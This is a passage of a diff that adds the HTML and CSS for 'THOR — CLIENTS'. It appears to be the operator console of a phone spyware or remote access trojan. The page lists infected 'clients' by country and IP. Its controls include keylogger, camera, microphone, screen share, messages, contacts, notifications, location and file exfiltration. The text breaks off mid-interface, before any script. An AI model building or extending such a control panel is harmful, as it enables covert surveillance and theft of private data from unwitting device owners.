@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>THOR — CLIENTS</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+  :root {
+    --red: #cc0000;
+    --red-bright: #ff1a1a;
+    --red-dim: #7a0000;
+    --red-glow: rgba(204,0,0,0.4);
+    --bg: #000000;
+    --border: rgba(180,0,0,0.5);
+    --border-dim: rgba(100,0,0,0.3);
+    --text: #e8e8e8;
+    --text-dim: #666;
+    --green-ok: #00ff88;
+    --font-mono: 'Share Tech Mono', monospace;
+    --font-display: 'Orbitron', sans-serif;
+    --font-body: 'Rajdhani', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body {
+    width: 100%; height: 100%;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-body);
+    overflow: hidden;
+    user-select: none;
+  }
+
+  .scanlines {
+    position: fixed; inset: 0; z-index: 1; pointer-events: none;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.06) 2px, rgba(0,0,0,0.06) 4px);
+  }
+
+  /* ─── PAGE LAYOUT ─── */
+  #page {
+    position: relative; z-index: 10;
+    display: grid;
+    grid-template-rows: auto 1fr auto;
+    height: 100vh;
+    overflow: hidden;
+  }
+
+  /* ─── TOP BAR ─── */
+  #topbar {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 9px 16px;
+    background: rgba(6,0,0,0.96);
+    border-bottom: 1px solid var(--border-dim);
+    flex-shrink: 0;
+  }
+  #topbar-title {
+    font-family: var(--font-display);
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--red-bright);
+    text-shadow: 0 0 10px var(--red-glow);
+  }
+  .topbar-spacer { flex: 1; }
+
+  /* Select All */
+  #select-all-wrap {
+    display: flex; align-items: center; gap: 8px;
+    padding: 6px 12px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    transition: all 0.15s;
+  }
+  #select-all-wrap:hover { border-color: var(--red-bright); color: var(--text); }
+  .sa-box {
+    width: 12px; height: 12px;
+    border: 1px solid var(--red-dim); border-radius: 2px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; transition: all 0.15s;
+  }
+  #select-all-wrap.checked .sa-box {
+    background: rgba(180,0,0,0.4); border-color: var(--red-bright);
+    box-shadow: 0 0 6px var(--red-glow);
+  }
+  #select-all-wrap.checked .sa-box::after { content: 'x'; font-size: 8px; color: var(--red-bright); }
+
+  /* Search */
+  #search-wrap {
+    display: flex; align-items: center;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    width: 240px;
+  }
+  #search-input {
+    flex: 1; background: rgba(12,0,0,0.8); border: none; outline: none;
+    padding: 7px 12px; font-family: var(--font-mono); font-size: 10px; color: var(--text-dim);
+  }
+  #search-input::placeholder { color: rgba(100,0,0,0.5); }
+  #search-input:focus { color: var(--text); }
+  #search-btn {
+    width: 36px; height: 34px;
+    background: rgba(20,0,0,0.9); border: none;
+    border-left: 1px solid var(--border-dim);
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; color: var(--red-dim); transition: color 0.15s, background 0.15s;
+  }
+  #search-btn:hover { background: rgba(150,0,0,0.2); color: var(--red-bright); }
+  #search-btn svg { width: 14px; height: 14px; fill: currentColor; }
+
+  /* ─── BODY SPLIT ─── */
+  #body {
+    display: grid;
+    grid-template-columns: 340px 1fr; /* Left Panel Slightly Bigger */
+    overflow: hidden;
+    min-height: 0;
+  }
+
+  /* ─── LEFT: CLIENT LIST ─── */
+  #client-list-panel {
+    border-right: 1px solid var(--border-dim);
+    display: flex; flex-direction: column;
+    overflow: hidden;
+  }
+
+  .panel-label {
+    font-family: var(--font-display);
+    font-size: 8px; letter-spacing: 3px;
+    color: var(--red-dim);
+    padding: 8px 14px;
+    border-bottom: 1px solid rgba(60,0,0,0.3);
+    flex-shrink: 0;
+  }
+
+  #client-list {
+    flex: 1; overflow-y: auto; padding: 4px 0;
+  }
+  #client-list::-webkit-scrollbar { width: 3px; }
+  #client-list::-webkit-scrollbar-thumb { background: var(--red-dim); }
+
+  .client-card {
+    display: grid;
+    grid-template-columns: 30px 1fr 10px 22px;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(55,0,0,0.15);
+    cursor: pointer;
+    transition: all 0.2s ease;
+    position: relative;
+    border-left: 3px solid transparent;
+  }
+  .client-card:hover { background: rgba(100,0,0,0.08); border-left-color: rgba(150,0,0,0.3); }
+  .client-card.selected { 
+    background: rgba(180,0,0,0.1); 
+    border-left-color: var(--red-bright);
+    box-shadow: inset 5px 0 15px rgba(204,0,0,0.1), 0 0 15px rgba(204,0,0,0.05);
+  }
+
+  .cc-flag {
+    width: 30px; height: 20px; border-radius: 2px;
+    background: rgba(25,0,0,0.8); border: 1px solid rgba(100,0,0,0.3);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; flex-shrink: 0;
+  }
+
+  .cc-info { min-width: 0; }
+  .cc-name {
+    font-family: var(--font-body); font-size: 12px; font-weight: 600;
+    color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .cc-meta {
+    font-family: var(--font-mono); font-size: 9px; color: var(--text-dim);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .cc-country { color: var(--red-dim); }
+
+  .cc-online {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: rgba(80,80,80,0.5); flex-shrink: 0;
+  }
+  .cc-online.on {
+    background: var(--green-ok);
+    box-shadow: 0 0 5px var(--green-ok);
+    animation: op 2s ease-in-out infinite;
+  }
+  @keyframes op { 0%,100%{opacity:1} 50%{opacity:0.35} }
+
+  .cc-dots {
+    width: 22px; height: 22px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 4px; cursor: pointer;
+    color: var(--text-dim); font-size: 15px; line-height: 1;
+    transition: all 0.14s; flex-shrink: 0;
+  }
+  .cc-dots:hover { background: rgba(150,0,0,0.2); color: var(--red-bright); }
+
+  .cc-dropdown {
+    position: absolute; right: 36px; top: 50%;
+    transform: translateY(-50%);
+    background: rgba(6,0,0,0.98);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 4px 0;
+    z-index: 200;
+    min-width: 148px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.9);
+    display: none;
+  }
+  .cc-dropdown.open { display: block; }
+  .cc-dropdown-item {
+    padding: 7px 14px;
+    font-family: var(--font-mono); font-size: 10px; color: var(--text-dim);
+    cursor: pointer; transition: background 0.12s, color 0.12s;
+    display: flex; align-items: center; gap: 8px;
+    border-bottom: 1px solid rgba(60,0,0,0.15);
+  }
+  .cc-dropdown-item:last-child { border-bottom: none; }
+  .cc-dropdown-item:hover { background: rgba(150,0,0,0.2); color: var(--red-bright); }
+  .cc-dropdown-item svg { width: 12px; height: 12px; fill: currentColor; flex-shrink: 0; }
+
+  #client-list-empty {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100%; gap: 10px;
+    color: rgba(80,0,0,0.45);
+    font-family: var(--font-mono); font-size: 10px; letter-spacing: 2px;
+  }
+  #client-list-empty svg { width: 30px; height: 30px; fill: rgba(80,0,0,0.35); }
+
+  /* ─── RIGHT: CONTROLS PANEL ─── */
+  #controls-panel {
+    display: flex; flex-direction: column; overflow: hidden;
+  }
+
+  /* Output Area */
+  #output-area {
+    flex: 1;
+    overflow-y: auto;
+    padding: 12px 14px;
+    min-height: 0;
+    background: radial-gradient(circle at center, #0a0000 0%, #000 100%);
+  }
+  #output-empty {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100%; gap: 10px;
+    color: rgba(80,0,0,0.4);
+    font-family: var(--font-mono); font-size: 9px; letter-spacing: 2px;
+    text-align: center;
+  }
+  #output-empty svg { width: 28px; height: 28px; fill: rgba(80,0,0,0.3); margin-bottom: 4px; }
+
+  /* Bottom Controls Strip */
+  #bottom-controls {
+    --icon-size: 28px;
+    --grid-offset: 15px;
+
+    flex-shrink: 0;
+    border-top: 1px solid var(--border-dim);
+    padding: 8px 10px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    margin-bottom: var(--grid-offset);
+    position: relative;
+    bottom: var(--grid-offset);
+    background: rgba(5,0,0,0.95);
+  }
+
+  #action-btns {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 6px;
+  }
+  .action-btn {
+    padding: 5px 0;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--red-bright);
+    font-family: var(--font-mono);
+    font-size: 8px; letter-spacing: 0.5px;
+    cursor: pointer; text-align: center;
+    transition: all 0.15s;
+  }
+  .action-btn:hover { background: rgba(180,0,0,0.14); box-shadow: 0 0 10px var(--red-glow); }
+
+  #icon-grid-wrapper {
+    display: flex;
+    justify-content: center;
+    padding: 10px;
+  }
+  #icon-grid {
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 6px;
+    padding: 14px 16px;
+    background: rgba(12,0,0,0.9);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    box-shadow: 0 0 20px rgba(180,0,0,0.15), inset 0 0 30px rgba(0,0,0,0.5);
+  }
+
+  .feat-btn {
+    width: 58px;
+    height: 58px;
+    aspect-ratio: unset;
+    display: flex; align-items: center; justify-content: center;
+    background: rgba(20,0,0,0.8);
+    border: 1px solid rgba(150,0,0,0.45);
+    border-radius: 10px;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.18s ease;
+    padding: 0;
+  }
+  .feat-btn:hover {
+    background: rgba(160,0,0,0.18);
+    border-color: var(--red-bright);
+    box-shadow: 0 0 14px var(--red-glow), inset 0 0 6px rgba(204,0,0,0.07);
+    transform: translateY(-2px);
+  }
+  .feat-btn.active {
+    background: var(--red-dim);
+    border-color: var(--red-bright);
+    box-shadow: 0 0 10px var(--red-glow);
+  }
+
+  .feat-btn svg {
+    width: var(--icon-size);
+    height: var(--icon-size);
+    fill: var(--red-bright);
+    pointer-events: none;
+  }
+
+  .feat-tip {
+    position: absolute;
+    bottom: calc(100% + 8px);
+    left: 50%; transform: translateX(-50%);
+    background: rgba(4,0,0,0.97);
+    border: 1px solid var(--red-bright);
+    border-radius: 4px;
+    padding: 4px 10px;
+    font-family: var(--font-mono);
+    font-size: 9px; color: var(--red-bright);
+    white-space: nowrap;
+    pointer-events: none;
+    opacity: 0; transition: opacity 0.14s;
+    z-index: 300;
+    text-shadow: 0 0 6px var(--red-glow);
+    letter-spacing: 1px;
+  }
+  .feat-tip::after {
+    content: '';
+    position: absolute;
+    top: 100%; left: 50%; transform: translateX(-50%);
+    border: 4px solid transparent;
+    border-top-color: var(--red-bright);
+  }
+  .feat-btn:hover .feat-tip { opacity: 1; }
+
+  /* Bottom Bar */
+  #bottom-bar {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    padding: 9px 10px;
+    background: rgba(5,0,0,0.96);
+    border-top: 1px solid var(--border-dim);
+    flex-shrink: 0;
+    margin-bottom: 30px; 
+  }
+  .bottom-btn {
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 8px 0;
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--red-bright);
+    font-family: var(--font-mono); font-size: 10px;
+    cursor: pointer; transition: all 0.17s; letter-spacing: 1px;
+  }
+  .bottom-btn:hover { background: rgba(180,0,0,0.14); box-shadow: 0 0 12px var(--red-glow); }
+
+  /* Module Specific UI */
+  .camera-view img, .screen-view img { width: 100%; max-height: 100%; object-fit: contain; }
+  .table-container { width: 100%; font-family: var(--font-mono); font-size: 11px; }
+  table { width: 100%; border-collapse: collapse; }
+  th { text-align: left; color: var(--red-bright); padding: 8px; border-bottom: 1px solid var(--border); }
+  td { padding: 8px; border-bottom: 1px solid rgba(100,0,0,0.1); color: #ccc; }
+  .file-item { display: flex; align-items: center; gap: 10px; padding: 6px; cursor: pointer; border-radius: 4px; }
+  .file-item:hover { background: rgba(255,0,0,0.1); }
+  #map-container { width: 100%; height: 350px; border: 1px solid var(--border); border-radius: 8px; margin-top: 10px; }
+  
+  /* Automation Form */
+  .auto-form { display: flex; flex-direction: column; gap: 10px; max-width: 400px; margin: auto; padding: 20px; background: rgba(20,0,0,0.5); border-radius: 8px; border: 1px solid var(--border-dim); }
+  .auto-form input { background: #000; color: #fff; border: 1px solid var(--border); padding: 8px; font-family: var(--font-mono); font-size: 11px; outline: none; }
+  .auto-form input:focus { border-color: var(--red-bright); }
+  
+  /* ── SCREEN SHARE — 9:16 portrait phone frame ── */
+  .screen-phone-frame {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100%;
+    padding: 10px;
+  }
+  .phone-shell {
+    position: relative;
+    width: 320px;
+    height: 570px;
+    max-width: 90%;
+    max-height: 85vh;
+    background: #000;
+    border: 2px solid var(--border);
+    border-radius: 0; /* rectangular */
+    overflow: hidden;
+    box-shadow: 0 0 20px var(--red-glow);
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .phone-shell img {
+    width: 100%; height: 100%;
+    object-fit: fill; /* perfectly fit */
+    background: #000;
+    display: block;
+  }
+  .phone-shell .phone-offline {
+    width: 100%; height: 100%;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--red-dim); letter-spacing: 2px;
+    flex-direction: column; gap: 12px;
+  }
+  .phone-shell .phone-offline svg { width: 32px; height: 32px; fill: var(--red-dim); opacity: 0.5; }
+  
+  .screen-ctrl-row {
+    display: flex; gap: 12px; margin-top: 15px;
+  }
+  .screen-ctrl-row .action-btn { width: 100px; font-size: 10px; padding: 8px 0; }
+
+  /* ── CAMERA — portrait phone frame ── */
+  .camera-phone-frame {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100%; padding: 10px;
+  }
+  .camera-shell {
+    position: relative;
+    width: 320px;
+    height: 570px;
+    max-width: 90%;
+    max-height: 85vh;
+    background: #000;
+    border: 2px solid var(--border);
+    border-radius: 0; /* rectangular */
+    overflow: hidden;
+    box-shadow: 0 0 20px var(--red-glow);
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .camera-shell img {
+    width: 100%;
+    height: 100%;
+    object-fit: fill; /* perfectly fit */
+    display: block;
+    transform: rotate(270deg) scaleX(-1); /* Correct front cam rotation */
+  }
+  .camera-shell img.back-cam { transform: rotate(90deg) scaleX(1); }
+  .camera-shell .cam-offline {
+    width: 100%; height: 100%;
+    display: flex; align-items: center; justify-content: center;
+    font-family: var(--font-mono); font-size: 11px;
+    color: var(--red-dim); letter-spacing: 2px;
+    flex-direction: column; gap: 12px;
+  }
+  .cam-ctrl-row {
+    display: flex; gap: 12px; margin-top: 15px;
+  }
+  .cam-ctrl-row .action-btn { width: 100px; font-size: 10px; padding: 8px 0; }
+
+  /* ── MICROPHONE — waveform + controls ── */
+  .mic-panel {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100%; gap: 14px;
+    padding: 10px;
+  }
+  .mic-icon-wrap {
+    position: relative;
+    width: 70px; height: 70px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .mic-ring {
+    position: absolute; inset: 0; border-radius: 50%;
+    border: 2px solid var(--red-dim);
+    animation: mic-ring-idle 2s ease-in-out infinite;
+  }
+  .mic-ring.r2 { inset: -10px; border-color: rgba(180,0,0,0.3); animation-delay: 0.3s; }
+  .mic-ring.r3 { inset: -20px; border-color: rgba(180,0,0,0.15); animation-delay: 0.6s; }
+  .mic-ring.active { border-color: var(--red-bright); box-shadow: 0 0 10px var(--red-glow); }
+  @keyframes mic-ring-idle { 0%,100%{transform:scale(1);opacity:0.6} 50%{transform:scale(1.06);opacity:1} }
+  @keyframes mic-ring-active { 0%{transform:scale(1)} 50%{transform:scale(1.1+var(--lvl,0))} 100%{transform:scale(1)} }
+  .mic-icon-btn {
+    width: 60px; height: 60px; border-radius: 50%;
+    background: rgba(20,0,0,0.9);
+    border: 2px solid var(--red-bright);
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; z-index: 1;
+    box-shadow: 0 0 14px var(--red-glow);
+    transition: all 0.2s;
+  }
+  .mic-icon-btn:hover { background: rgba(180,0,0,0.25); }
+  .mic-icon-btn svg { width: 28px; height: 28px; fill: var(--red-bright); }
+  #mic-waveform {
+    width: 100%; height: 60px;
+    border-radius: 8px;
+    background: rgba(8,0,0,0.8);
+    border: 1px solid var(--border-dim);
+  }
+  .mic-status {
+    font-family: var(--font-mono); font-size: 9px;
+    color: var(--red-dim); letter-spacing: 2px;
+    height: 14px;
+  }
+  .mic-status.on { color: var(--green-ok); text-shadow: 0 0 8px var(--green-ok); }
+  .mic-btn-row {
+    display: flex; gap: 10px;
+  }
+  .mic-btn-row .action-btn { font-size: 9px; padding: 6px 14px; width: auto; }
+
+  /* ── FILE MANAGER — selectable files + download ── */
+  #file-explorer {
+    display: flex; flex-direction: column;
+    height: 100%;
+  }
+  .fm-path-bar {
+    font-family: var(--font-mono); font-size: 9px;
+    color: var(--red-dim); padding: 6px 10px;
+    border-bottom: 1px solid var(--border-dim);
+    letter-spacing: 1px; flex-shrink: 0;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .fm-path-bar span { color: var(--red-bright); }
+  .fm-back-btn {
+    background: transparent; border: 1px solid var(--border-dim);
+    border-radius: 3px; color: var(--red-dim);
+    font-family: var(--font-mono); font-size: 9px;
+    padding: 2px 8px; cursor: pointer; transition: all 0.15s;
+  }
+  .fm-back-btn:hover { border-color: var(--red-bright); color: var(--red-bright); }
+  .fm-list {
+    flex: 1; overflow-y: auto; padding: 4px 0;
+  }
+  .fm-list::-webkit-scrollbar { width: 3px; }
+  .fm-list::-webkit-scrollbar-thumb { background: var(--red-dim); }
+  .file-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 7px 12px; cursor: pointer;
+    border-bottom: 1px solid rgba(60,0,0,0.15);
+    font-family: var(--font-mono); font-size: 10px;
+    color: var(--text-dim); transition: background 0.12s;
+    position: relative;
+  }
+  .file-item:hover { background: rgba(100,0,0,0.12); color: var(--text); }
+  .file-item.selected { background: rgba(150,0,0,0.2); color: var(--red-bright); }
+  .file-item .fi-icon { font-size: 14px; flex-shrink: 0; }
+  .file-item .fi-name { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .file-item .fi-size { font-size: 9px; color: var(--red-dim); flex-shrink: 0; }
+  .fi-check {
+    width: 11px; height: 11px; border: 1px solid var(--red-dim);
+    border-radius: 2px; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.12s;
+  }
+  .file-item.selected .fi-check { background: var(--red-dim); border-color: var(--red-bright); }
+  .file-item.selected .fi-check::after { content: 'x'; font-size: 7px; color: var(--red-bright); }
+  .fm-dl-bar {
+    display: flex; align-items: center; gap: 8px;
+    padding: 7px 10px; border-top: 1px solid var(--border-dim);
+    flex-shrink: 0; background: rgba(8,0,0,0.9);
+  }
+  .fm-dl-bar span { font-family: var(--font-mono); font-size: 9px; color: var(--red-dim); flex: 1; }
+  .fm-dl-btn {
+    display: flex; align-items: center; gap: 6px;
+    padding: 5px 14px; background: rgba(150,0,0,0.2);
+    border: 1px solid var(--red-bright); border-radius: 4px;
+    color: var(--red-bright); font-family: var(--font-mono);
+    font-size: 9px; cursor: pointer; letter-spacing: 1px;
+    transition: all 0.15s;
+  }
+  .fm-dl-btn:hover { background: rgba(180,0,0,0.35); box-shadow: 0 0 10px var(--red-glow); }
+  .fm-dl-btn svg { width: 12px; height: 12px; fill: currentColor; }
+  
+  /* ── TOAST NOTIFICATION ── */
+  #thor-toast {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0.85);
+    background: rgba(6,0,0,0.97);
+    border: 1px solid var(--red-bright);
+    border-radius: 8px;
+    padding: 16px 32px;
+    font-family: var(--font-display);
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--red-bright);
+    text-shadow: 0 0 12px var(--red-glow);
+    box-shadow: 0 0 40px var(--red-glow), inset 0 0 20px rgba(0,0,0,0.8);
+    z-index: 99999;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.2s ease, transform 0.2s ease;
+  }
+  #thor-toast.show {
+    opacity: 1;
+    transform: translate(-50%, -50%) scale(1);
+  }
+  #thor-toast::before {
+    content: '//';
+    color: var(--red-dim);
+    margin-right: 10px;
+    font-size: 10px;
+  }
+  #thor-toast::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 10%; right: 10%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--red-bright), transparent);
+    animation: toast-line 1.5s ease-in-out infinite;
+  }
+  @keyframes toast-line { 0%,100%{opacity:0.3} 50%{opacity:1} }
+  
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+
+<div id="page">
+<div id="topbar">
+  <span id="topbar-title">CLIENTS</span>
+  <div class="topbar-spacer"></div>
+  <div id="search-wrap">      <input id="search-input" type="text" placeholder="Search By Name, Country, IP..." oninput="filterClients(this.value)">
+      <button id="search-btn"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
+    </div>
+  </div>
+
+  <div id="body">
+    <div id="client-list-panel">
+      <div class="panel-label">// ACTIVE CLIENTS</div>
+      <div id="client-list">
+        <div id="client-list-empty">
+          <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+          NO ACTIVE CLIENTS
+        </div>
+      </div>
+      <div id="bottom-bar">
+        <button class="bottom-btn" onclick="bulkAction('download')">DOWNLOAD</button>
+        <button class="bottom-btn" onclick="bulkAction('upload')">UPLOAD</button>
+      </div>
+    </div>
+
+    <div id="controls-panel">
+      <div id="output-area">
+        <div id="output-empty">
+          <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm7 13H5v-.23c0-.62.28-1.2.76-1.58C7.47 15.82 9.64 15 12 15s4.53.82 6.24 2.19c.48.38.76.97.76 1.58V19z"/></svg>
+          SELECT A CLIENT AND FEATURE
+        </div>
+      </div>
+
+      <div id="bottom-controls">
+        <div id="action-btns">
+          <button class="action-btn" onclick="bulkAction('block')">Block Client</button>
+          <button class="action-btn" onclick="bulkAction('phone_info')">Phone info</button>
+          <button class="action-btn" onclick="bulkAction('folder')">Client Folder</button>
+          <button class="action-btn" onclick="bulkAction('uncheck')">unCheck client</button>
+        </div>
+        <div id="icon-grid-wrapper">
+          <div id="icon-grid">
+            <button class="feat-btn" onclick="featureAction('file_manager')">
+              <span class="feat-tip">File Manager</span>
+              <svg viewBox="0 0 24 24"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-1 8h-3v3h-2v-3h-3v-2h3V9h2v3h3v2z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('messages')">
+              <span class="feat-tip">Messages</span>
+              <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('contacts')">
+              <span class="feat-tip">Contacts</span>
+              <svg viewBox="0 0 24 24"><path d="M20 0H4v2h16V0zM4 24h16v-2H4v2zM20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-8 2.75c1.24 0 2.25 1.01 2.25 2.25S13.24 11.25 12 11.25 9.75 10.24 9.75 9 10.76 6.75 12 6.75zM17 17H7v-1.5c0-1.67 3.33-2.5 5-2.5s5 .83 5 2.5V17z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('device_info')">
+              <span class="feat-tip">Device Info</span>
+              <svg viewBox="0 0 24 24"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85a.637.637 0 0 0-.83.22l-1.88 3.24a11.45 11.45 0 0 0-8.94 0L5.65 5.67a.643.643 0 0 0-.87-.2c-.28.18-.37.54-.22.83L6.4 9.48A10.78 10.78 0 0 0 1 18h22a10.78 10.78 0 0 0-5.4-8.52zM7 15.25a1.25 1.25 0 1 1 0-2.5 1.25 1.25 0 0 1 0 2.5zm10 0a1.25 1.25 0 1 1 0-2.5 1.25 1.25 0 0 1 0 2.5z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('screen_monitor')">
+              <span class="feat-tip">Screen Share</span>
+              <svg viewBox="0 0 24 24"><path d="M20 3H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h3l-1 1v2h12v-2l-1-1h3c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 13H4V5h16v11z"/><path d="M10 8l5 4-5 4V8z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('screen_reader')">
+                <span class="feat-tip">Screen Reader</span>
+                <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/><path d="M9.5 8.5h5v1.5h-5zm0 2.5h5v1.5h-5zm0 2.5h3v1.5h-3z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('camera')">
+              <span class="feat-tip">Camera</span>
+              <svg viewBox="0 0 24 24"><path d="M9.4 3L7.4 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2h-3.4l-2-2H9.4z"/><circle cx="12" cy="12" r="3.2"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('microphone')">
+              <span class="feat-tip">Microphone</span>
+              <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 2.99-1.34 2.99-3L15 5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('keylogger')">
+              <span class="feat-tip">Keylogger</span>
+              <svg viewBox="0 0 24 24"><path d="M20 5H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 5H5v-2h2v2zm9 0H8v-2h8v2zm0-3h-2v-2h2v2zm0-3h-2V8h2v2zm3 6h-2v-2h2v2zm0-3h-2v-2h2v2zm0-3h-2V8h2v2z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('notifications')">
+                <span class="feat-tip">Notifications</span>
+                <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('automation')">
+                <span class="feat-tip">Automation</span>
+                <svg viewBox="0 0 24 24"><path d="M13 1.07V9h7c0-4.08-3.05-7.44-7-7.93zM4 15c0 4.42 3.58 8 8 8s8-3.58 8-8v-4H4v4zm7-13.93C7.05 1.56 4 4.92 4 9h7V1.07z"/></svg>
+            </button>
+            <button class="feat-btn" onclick="featureAction('location')">
+              <span class="feat-tip">Location</span>
